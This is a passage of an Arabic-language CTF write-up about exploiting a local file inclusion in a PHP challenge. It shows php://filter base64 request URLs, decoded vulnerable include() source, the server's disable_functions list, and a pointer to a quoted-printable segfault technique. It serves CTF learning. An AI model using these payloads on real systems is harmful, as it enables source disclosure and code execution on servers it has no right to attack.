<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>ol<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\f</span>fuf_1.0.2_windows_amd64&gt;python -c <span style="color:#e6db74">&#34;print len(&#39;fa25e54758d5d5c1927781a6ede89f8a&#39;)&#34;</span>
<span style="color:#ae81ff">32</span>

C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>ol<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\f</span>fuf_1.0.2_windows_amd64&gt;
</code></pre></div><!-- raw HTML omitted -->
<p>تمام الطول
32 كما نعرف 32 == md5</p>
<p>نجرب</p>
<p><img src="/images/2020-07-10_192103.png" alt="Images"></p>
<p>نلاحظ انه يعمل تحويل redirect للصفحة
flflflflfag.php</p>
<p>نجرب نراها</p>
<p><img src="/images/2020-07-10_192159.png" alt="Images"></p>
<p>اذا هناك lfi واضحة  هنا</p>
<p>نجرب php://filter/convret.base64-encode/resource=</p>
<!-- raw HTML omitted -->
<pre><code>http://61da71ac-e4d7-4eac-96c2-58cbde529147.node3.buuoj.cn/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php

http://61da71ac-e4d7-4eac-96c2-58cbde529147.node3.buuoj.cn/flflflflag.php?file=php://filter/convert.base64-encode/resource=dir.php

</code></pre><!-- raw HTML omitted -->
<p>نقوم بعمل decode ل base64</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">flflflflag.php

<span style="color:#75715e">&lt;?php</span>
$file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;file&#39;</span>];
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/data|input|zip/is&#39;</span>,$file)){
	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;nonono&#39;</span>);
}
<span style="color:#f92672">@</span><span style="color:#66d9ef">include</span>($file);
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;include($_GET[&#34;file&#34;])&#39;</span>;
<span style="color:#75715e">?&gt;</span>

dir.php

<span style="color:#75715e">&lt;?php</span>
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;/tmp&#39;</span>));
</code></pre></div><!-- raw HTML omitted -->
<p><img src="/images/2020-07-10_191736.png" alt="Images"></p>
<p>نجرب</p>
<p>ما تعلمناه</p>
<p><img src="/images/2020-07-10_192525.png" alt="Images"></p>
<p>تمام نجرب</p>
<p><img src="/images/2020-07-10_192556.png" alt="Images"></p>
<p>نرى dir.php
الان</p>
<p><img src="/images/2020-07-10_192654.png" alt="Images"></p>
<p>نعمل include للملف</p>
<p><img src="/images/2020-07-10_192727.png" alt="Images"></p>
<p>نرى disable function</p>
<pre><code>disable_functions pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir 
</code></pre><p>eval ليست غير مفعلة نجرب
<img src="/images/2020-07-10_192923.png" alt="Images"></p>
<p><img src="/images/2020-07-10_193037.png" alt="Images"></p>
<p>المهم الفلاق موجود</p>
<p><img src="/images/2020-07-10_193822.png" alt="Images"></p>
<!-- raw HTML omitted -->
<h1 id="3--convertquoted-printable-encode--segment-fault-">3 ( convert.quoted-printable-encode  segment fault )</h1>
<p><a href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view">https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view</a></p>

    </div>
    <div class="post-footer">
      <div class="info">
        
        
      </div>
    </div>

    
           
    
</div>


                </div>
            </div>
        </div>
</body>



<script type="text/javascript" src="https://h4dla3.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>




<script type="text/javascript" src="https://h4dla3.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>

<script type="text/javascript" src="https://h4dla3.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>

</html>
